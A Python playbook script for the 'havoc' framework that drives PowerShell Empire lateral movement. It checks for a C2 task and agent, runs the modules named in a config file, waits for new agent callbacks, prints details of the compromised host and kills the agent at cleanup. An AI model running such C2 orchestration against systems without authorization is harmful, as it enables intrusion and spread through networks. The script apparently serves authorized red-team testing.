# Import the supporting Python packages.
import os
import string
import random
import pprint
import time as t
import argparse
from configparser import ConfigParser

# Import the havoc Python package.
import havoc

init_parser = argparse.ArgumentParser(description='havoc playbook - PowerShell Empire Lateral Movement')

init_parser.add_argument('--profile', help='Use a specific profile from your credential file')
init_args = init_parser.parse_args()

profile = init_args.profile

# Load the ./HAVOC configuration file
havoc_config = ConfigParser()
havoc_config_file = os.path.expanduser('~/.havoc/config')
havoc_config.read(havoc_config_file)

# Get api_key and secret_key
if profile:
    api_key = havoc_config.get(profile, 'API_KEY')
    secret = havoc_config.get(profile, 'SECRET')
    api_region = havoc_config.get(profile, 'API_REGION')
    api_domain_name = havoc_config.get(profile, 'API_DOMAIN_NAME')
else:
    api_key = havoc_config.get('default', 'API_KEY')
    secret = havoc_config.get('default', 'SECRET')
    api_region = havoc_config.get('default', 'API_REGION')
    api_domain_name = havoc_config.get('default', 'API_DOMAIN_NAME')

h = havoc.Connect(api_region, api_domain_name, api_key, secret)

# Configure pretty print for displaying output.
pp = pprint.PrettyPrinter(indent=4)

# Create a config parser and setup config parameters
config = ConfigParser(allow_no_value=True)
config.optionxform = str
config.read('havoc-playbooks/pse_lateral_movement/pse_lateral_movement.ini')

c2_task_name = config.get('c2_task', 'task_name')
c2_agent_name = config.get('c2_task', 'agent_name')

agent_exists = None


def clean_up():

    if agent_exists:
        print(f'\nSending kill command to agent with name {agent_exists[0]}.\n')
        instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
        instruct_command = 'kill_agent'
        agent_name = agent_exists[0]
        instruct_args = {'Name': f'{agent_name}'}
        kill_agent_response = h.interact_with_task(agent_exists[1], instruct_command, instruct_instance, instruct_args)
        if 'outcome' in kill_agent_response and kill_agent_response['outcome'] == 'failed':
            print(f'Failed to kill agent with name {agent_exists[0]}.\n')
            print(kill_agent_response)

    exit('\nDone... Exiting.\n')

# Verify c2_task exists
print(f'\nVerifying that powershell_empire task {c2_task_name} exists.')
c2_task = h.verify_task(c2_task_name, 'powershell_empire')
if c2_task:
    print(f'C2 task {c2_task_name} found.')
else:
    exit(f'No powershell_empire task with name {c2_task_name} found. Exiting...')

# Verify that the C2 agent exists.
print(f'\nVerifying that agent {c2_agent_name} exists.')
agent = h.verify_agent(c2_task_name, c2_agent_name)
if agent:
    print(f'Agent {c2_agent_name} exists. Continuing...\n')
else:
    exit(f'Agent {c2_agent_name} not found. Exiting...\n')

# Execute the modules.
for section in config.sections():
    if section != 'c2_task':
        module_config = dict(config.items(section))
        if module_config['Enable'].lower() == 'true':
            module = module_config['Module']
            del module_config['Module']
            comp_str = None
            if 'completion_string' in module_config:
                comp_str = module_config['completion_string']
                del module_config['completion_string']
            print(f'\nTasking agent with execute_module "{module}"\n')
            try:
                module_results = h.execute_agent_module(c2_task_name, c2_agent_name, module, module_config, wait_for_results=False, completion_string=comp_str)
                print(f'{module} results:\n')
                print(module_results)
            except KeyboardInterrupt:
                print('Interrupting execute_agent_module. Skipping to next module...')

            # Wait for the powershell_empire task to become idle.
            print(f'\nWaiting for powershell_empire task {c2_task_name} to become idle.')
            try:
                h.wait_for_idle_task(c2_task_name)
            except KeyboardInterrupt:
                exit('Interrupting wait_for_idle_task. Exiting...')
            print(f'{c2_task_name} is now idle.')

            # Wait for agent to connect and then print agent details.
            print(f'\nWaiting for an agent connection on task {c2_task_name}.\n')
            agent_name = None
            try:
                wait_for_c2_response = h.wait_for_c2(c2_task_name)
                agent_name = wait_for_c2_response['agent_info']['name']
                agent_hostname = wait_for_c2_response['agent_info']['hostname']
                agent_internal_ip = wait_for_c2_response['agent_info']['internal_ip']
                agent_external_ip = wait_for_c2_response['agent_info']['external_ip']
                agent_os_details = wait_for_c2_response['agent_info']['os_details']
                agent_arch = wait_for_c2_response['agent_info']['architecture']
                agent_username = wait_for_c2_response['agent_info']['username']
                agent_high_integrity = wait_for_c2_response['agent_info']['high_integrity']
                agent_exists = [agent_name, c2_task_name]
                print(f'Agent connected with name {agent_name}\n')
            except KeyboardInterrupt:
                print('Wait for agent operation interrupted. No agent connected.')

            if agent_exists:
                print(
                    '\n+--- Agent Details ---+'
                    f'\nC2 task name: {c2_task_name}'
                    f'\nAgent name: {agent_name}'
                    f'\nAgent hostname: {agent_hostname}'
                    f'\nAgent internal IP: {agent_internal_ip}'
                    f'\nAgent external IP: {agent_external_ip}'
                    f'\nAgent OS details: {agent_os_details}'
                    f'\nAgent system architecture: {agent_arch}'
                    f'\nAgent username: {agent_username}'
                    f'\nAgent is high integrity (0=no, 1=yes): {agent_high_integrity}'
                    '\n\nPlaybook will halt until prompted to proceed with clean up.'
                )
                print('\nPress Ctrl+C to proceed with clean up.')
                try:
                    while True:
                        t.sleep(2)
                except KeyboardInterrupt:
                    print('\nCtrl+C detected. Proceeding with clean up...')
                    clean_up()

# Playbook is complete.
exit('\nPlaybook operation completed. Exiting...')
